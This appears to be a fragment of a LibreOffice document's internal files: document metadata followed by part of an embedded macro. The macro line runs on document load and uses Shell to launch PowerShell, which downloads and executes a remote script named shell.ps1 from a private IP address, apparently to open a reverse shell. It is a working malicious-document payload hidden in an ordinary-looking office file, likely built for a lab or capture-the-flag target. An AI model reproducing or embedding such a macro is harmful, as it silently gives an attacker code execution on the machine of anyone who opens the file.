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08:04:15.907916900</meta:creation-date>
    <meta:generator>LibreOffice/6.1.5.2$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
    <dc:date>2019-05-15T22:39:04.183068539</dc:date>
    <meta:editing-duration>PT7M43S</meta:editing-duration>
    <meta:editing-cycles>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OnLoad
	Shell("powershell.exe -version 2 IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.18/shell.ps1')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